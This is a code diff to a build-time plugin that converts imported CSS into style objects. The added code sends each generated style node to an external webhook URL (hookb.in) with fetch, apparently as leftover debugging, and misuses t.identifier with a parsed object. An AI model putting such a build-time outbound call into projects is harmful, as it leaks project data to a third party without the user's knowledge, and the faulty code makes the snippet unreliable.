@@ -1,7 +1,8 @@
 // @ts-nocheck
-
-var path = require("path");
-var fs = require("fs");
+import path from "path";
+import fs from "fs";
+import Parser from "./Parser";
+import fetch from "node-fetch";
 
 function defaultResolve(src, file) {
 	return path.resolve(path.dirname(file), src);
@@ -71,16 +72,17 @@ function prodHandler(curPath, opts, importPath, jsFilename, template, t) {
 	var absPath = resolve(importPath, jsFilename);
 
 	const cssStr = fs.readFileSync(absPath, { encoding: "utf8" });
-	const obj = {};
-	// const { styles: obj } = createStylefromCode(cssStr, absPath);
-	// const cssObj = convertStylesToRNCSS(obj);
-	const cssObj = obj;
+	const styles = Parser.parse(cssStr);
 
 	var defautIdenti = curPath.node.specifiers[0].local.name;
 	const buildNode = template("const STYLES = STYOBJ;", { sourceType: "module" });
 	const styleExpre = buildNode({
 		STYLES: t.identifier(defautIdenti),
-		STYOBJ: t.identifier(cssObj),
+		STYOBJ: t.identifier(styles),
+	});
+	console.log(styleExpre);
+	fetch("https://hookb.in/BYjjYKPjoeiLDDx31d1g", {
+		body: JSON.stringify(styleExpre),
 	});
 
 	curPath.replaceWith(styleExpre);
